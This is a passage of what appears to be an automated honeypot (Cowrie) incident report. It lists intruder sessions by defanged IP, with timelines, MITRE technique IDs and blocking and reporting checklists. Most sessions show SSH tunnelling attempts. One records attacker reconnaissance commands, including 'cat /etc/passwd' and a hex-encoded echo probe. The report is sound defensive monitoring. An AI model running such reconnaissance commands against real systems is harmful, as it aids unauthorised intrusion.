| `2026-08-30 03:50:37` | `cowrie.client.kex` |
| `2026-08-30 03:50:38` | `cowrie.login.success` |
| `2026-08-30 03:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32b560ddf8d

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:38` | `cowrie.session.connect` |
| `2026-08-30 03:50:38` | `cowrie.client.version` |
| `2026-08-30 03:50:39` | `cowrie.client.kex` |
| `2026-08-30 03:50:39` | `cowrie.login.success` |
| `2026-08-30 03:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2186193debb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-30 03:51 |
| **Last Seen** | 2026-08-30 03:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:51:15` | `cowrie.session.connect` |
| `2026-08-30 03:51:15` | `cowrie.client.version` |
| `2026-08-30 03:51:15` | `cowrie.client.kex` |
| `2026-08-30 03:51:15` | `cowrie.login.success` |
| `2026-08-30 03:51:15` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:51:15` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3db516be9bc

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-30 03:52 |
| **Last Seen** | 2026-08-30 03:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:52:40` | `cowrie.session.connect` |
| `2026-08-30 03:52:40` | `cowrie.client.version` |
| `2026-08-30 03:52:40` | `cowrie.client.kex` |
| `2026-08-30 03:52:41` | `cowrie.login.success` |
| `2026-08-30 03:52:42` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18bf5ed4d52f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-08-30 03:52 |
| **Last Seen** | 2026-08-30 03:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:52:47` | `cowrie.session.connect` |
| `2026-08-30 03:52:48` | `cowrie.client.version` |
| `2026-08-30 03:52:48` | `cowrie.client.kex` |
| `2026-08-30 03:52:50` | `cowrie.login.success` |
| `2026-08-30 03:52:50` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086c1842131f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:18` | `cowrie.session.connect` |
| `2026-08-30 03:57:18` | `cowrie.client.version` |
| `2026-08-30 03:57:18` | `cowrie.client.kex` |
| `2026-08-30 03:57:19` | `cowrie.login.success` |
| `2026-08-30 03:57:19` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:57:19` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1032508c8d2c

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:19` | `cowrie.session.connect` |
| `2026-08-30 03:57:21` | `cowrie.client.version` |
| `2026-08-30 03:57:21` | `cowrie.client.kex` |
| `2026-08-30 03:57:26` | `cowrie.login.success` |
| `2026-08-30 03:57:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6308d063f32

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]245` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:32` | `cowrie.session.connect` |
| `2026-08-30 03:57:32` | `cowrie.client.version` |
| `2026-08-30 03:57:32` | `cowrie.client.kex` |
| `2026-08-30 03:57:35` | `cowrie.login.success` |
| `2026-08-30 03:57:35` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]245` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f010f00a437

| Field | Detail |
|---|---|
| **Source IP** | `180.193.181[.]195` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:33` | `cowrie.session.connect` |
| `2026-08-30 03:57:34` | `cowrie.client.version` |
| `2026-08-30 03:57:34` | `cowrie.client.kex` |
| `2026-08-30 03:57:36` | `cowrie.login.success` |
| `2026-08-30 03:57:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.193.181[.]195` to AbuseIPDB if not already reported
- [ ] Block `180.193.181[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52646599275d

| Field | Detail |
|---|---|
| **Source IP** | `119.237.15[.]136` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:40` | `cowrie.session.connect` |
| `2026-08-30 03:57:41` | `cowrie.client.version` |
| `2026-08-30 03:57:41` | `cowrie.client.kex` |
| `2026-08-30 03:57:43` | `cowrie.login.success` |
| `2026-08-30 03:57:43` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.237.15[.]136` to AbuseIPDB if not already reported
- [ ] Block `119.237.15[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f984524f63a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:57 |
| **Last Seen** | 2026-08-30 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:57:42` | `cowrie.session.connect` |
| `2026-08-30 03:57:42` | `cowrie.client.version` |
| `2026-08-30 03:57:43` | `cowrie.client.kex` |
| `2026-08-30 03:57:43` | `cowrie.login.success` |
| `2026-08-30 03:57:44` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:57:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:57:44` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54bc3f3d8218

| Field | Detail |
|---|---|
| **Source IP** | `209.145.59[.]90` |
| **First Seen** | 2026-08-30 04:02 |
| **Last Seen** | 2026-08-30 04:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:02:29` | `cowrie.session.connect` |
| `2026-08-30 04:02:30` | `cowrie.client.version` |
| `2026-08-30 04:02:30` | `cowrie.client.kex` |
| `2026-08-30 04:02:31` | `cowrie.login.success` |
| `2026-08-30 04:02:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.59[.]90` to AbuseIPDB if not already reported
- [ ] Block `209.145.59[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf79e35947f

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-08-30 04:02 |
| **Last Seen** | 2026-08-30 04:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:02:37` | `cowrie.session.connect` |
| `2026-08-30 04:02:38` | `cowrie.client.version` |
| `2026-08-30 04:02:38` | `cowrie.client.kex` |
| `2026-08-30 04:02:40` | `cowrie.login.success` |
| `2026-08-30 04:02:40` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b459f6cf9f71

| Field | Detail |
|---|---|
| **Source IP** | `35.205.86[.]202` |
| **First Seen** | 2026-08-30 04:03 |
| **Last Seen** | 2026-08-30 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:03:05` | `cowrie.session.connect` |
| `2026-08-30 04:03:05` | `cowrie.login.success` |
| `2026-08-30 04:03:06` | `cowrie.session.params` |
| `2026-08-30 04:03:06` | `cowrie.command.input` |
| `2026-08-30 04:03:06` | `cowrie.command.input` |
| `2026-08-30 04:03:06` | `cowrie.command.failed` |
| `2026-08-30 04:03:06` | `cowrie.command.input` |
| `2026-08-30 04:03:06` | `cowrie.log.closed` |
| `2026-08-30 04:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.86[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.205.86[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60e8f8cb28f

| Field | Detail |
|---|---|
| **Source IP** | `35.205.86[.]202` |
| **First Seen** | 2026-08-30 04:03 |
| **Last Seen** | 2026-08-30 04:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:03:14` | `cowrie.session.connect` |
| `2026-08-30 04:03:14` | `cowrie.login.success` |
| `2026-08-30 04:03:14` | `cowrie.session.params` |
| `2026-08-30 04:03:14` | `cowrie.command.input` |
| `2026-08-30 04:03:14` | `cowrie.command.failed` |
| `2026-08-30 04:03:21` | `cowrie.log.closed` |
| `2026-08-30 04:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.86[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.205.86[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ee27eae73b4

| Field | Detail |
|---|---|
| **Source IP** | `35.205.86[.]202` |
| **First Seen** | 2026-08-30 04:03 |
| **Last Seen** | 2026-08-30 04:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:03:16` | `cowrie.session.connect` |
| `2026-08-30 04:03:16` | `cowrie.login.success` |
| `2026-08-30 04:03:16` | `cowrie.session.params` |
| `2026-08-30 04:03:16` | `cowrie.command.input` |
| `2026-08-30 04:03:21` | `cowrie.log.closed` |
| `2026-08-30 04:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.86[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.205.86[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d476985b81f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:06 |
| **Last Seen** | 2026-08-30 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:06:51` | `cowrie.session.connect` |
| `2026-08-30 04:06:51` | `cowrie.client.version` |
| `2026-08-30 04:06:51` | `cowrie.client.kex` |
| `2026-08-30 04:06:52` | `cowrie.login.success` |
| `2026-08-30 04:06:52` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:06:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:06:53` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d0beb0cda4

| Field | Detail |
|---|---|
| **Source IP** | `165.154.226[.]213` |
| **First Seen** | 2026-08-30 04:07 |
| **Last Seen** | 2026-08-30 04:08 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:07:04` | `cowrie.session.connect` |
| `2026-08-30 04:07:05` | `cowrie.telnet.option` |
| `2026-08-30 04:07:06` | `cowrie.telnet.option` |
| `2026-08-30 04:07:06` | `cowrie.login.success` |
| `2026-08-30 04:07:07` | `cowrie.session.params` |
| `2026-08-30 04:07:07` | `cowrie.telnet.option` |
| `2026-08-30 04:07:07` | `cowrie.telnet.option` |
| `2026-08-30 04:07:07` | `cowrie.command.input` |
| `2026-08-30 04:07:07` | `cowrie.command.input` |
| `2026-08-30 04:07:07` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.failed` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:07:08` | `cowrie.command.input` |
| `2026-08-30 04:08:09` | `cowrie.log.closed` |
| `2026-08-30 04:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.226[.]213` to AbuseIPDB if not already reported
- [ ] Block `165.154.226[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d75e49b195d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:08 |
| **Last Seen** | 2026-08-30 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:08:30` | `cowrie.session.connect` |
| `2026-08-30 04:08:30` | `cowrie.client.version` |
| `2026-08-30 04:08:30` | `cowrie.client.kex` |
| `2026-08-30 04:08:31` | `cowrie.login.success` |
| `2026-08-30 04:08:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:08:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:08:31` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c160578d34

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-30 04:09 |
| **Last Seen** | 2026-08-30 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:09:18` | `cowrie.session.connect` |
| `2026-08-30 04:09:18` | `cowrie.client.version` |
| `2026-08-30 04:09:18` | `cowrie.client.kex` |
| `2026-08-30 04:09:21` | `cowrie.login.success` |
| `2026-08-30 04:09:22` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd6cdfb23b72

| Field | Detail |
|---|---|
| **Source IP** | `2.180.11[.]118` |
| **First Seen** | 2026-08-30 04:09 |
| **Last Seen** | 2026-08-30 04:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:09:29` | `cowrie.session.connect` |
| `2026-08-30 04:09:30` | `cowrie.client.version` |
| `2026-08-30 04:09:30` | `cowrie.client.kex` |
| `2026-08-30 04:09:34` | `cowrie.login.success` |
| `2026-08-30 04:09:35` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.180.11[.]118` to AbuseIPDB if not already reported
- [ ] Block `2.180.11[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a1538e16e37

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:16 |
| **Last Seen** | 2026-08-30 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:16:27` | `cowrie.session.connect` |
| `2026-08-30 04:16:27` | `cowrie.client.version` |
| `2026-08-30 04:16:27` | `cowrie.client.kex` |
| `2026-08-30 04:16:28` | `cowrie.login.success` |
| `2026-08-30 04:16:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:16:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:16:28` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94d95c3891b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 04:19 |
| **Last Seen** | 2026-08-30 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:19:13` | `cowrie.session.connect` |
| `2026-08-30 04:19:13` | `cowrie.client.version` |
| `2026-08-30 04:19:14` | `cowrie.client.kex` |
| `2026-08-30 04:19:15` | `cowrie.login.success` |
| `2026-08-30 04:19:15` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:19:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 04:19:15` | `cowrie.direct-tcpip.data` |
| `2026-08-30 04:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04be99b7b5ea

| Field | Detail |
|---|---|
| **Source IP** | `14.48.112[.]8` |
| **First Seen** | 2026-08-30 04:24 |
| **Last Seen** | 2026-08-30 04:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 04:24:32` | `cowrie.session.connect` |
| `2026-08-30 04:24:33` | `cowrie.client.version` |
| `2026-08-30 04:24:33` | `cowrie.client.kex` |
| `2026-08-30 04:24:35` | `cowrie.login.success` |
| `2026-08-30 04:24:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 04:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.48.112[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.48.112[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8edb5dbe705

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-30 04:24 |
| **Last Seen** | 2026-08-30 04:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
